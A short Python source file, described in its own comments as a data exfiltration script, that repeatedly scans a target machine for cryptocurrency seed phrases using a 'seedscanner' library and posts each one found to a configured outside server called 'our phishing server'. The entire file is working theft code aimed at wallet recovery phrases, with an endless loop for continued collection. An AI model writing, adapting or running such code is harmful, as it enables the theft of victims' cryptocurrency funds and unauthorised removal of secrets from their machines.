# This file contains a simple data exfiltration script
# This uses the seed scanner library to search for cryptocurrency seed phrases
# If seeds are found, send them to an outside server
#
# Author: Josh McIntyre
#
import json
import requests
import time

import seedscanner

import clientconfig

# Routinely scan the system and send data
def exfiltrate():

    while True:
    
        # Initialize a seed scanner on this target machine
        # And execute the search
        scanner = seedscanner.SeedScanner(clientconfig.SEARCHDIR)
        seeds = scanner.scan()

        # Send the found seeds off to our phishing server
        for seed in seeds:
            data = { "seed" : seed }
            requests.post(clientconfig.SERVERURL, json=data)
            
        time.sleep(clientconfig.SLEEP)
        
# The main entry point for the program
def main():

    exfiltrate()

if __name__ == "__main__":
    main()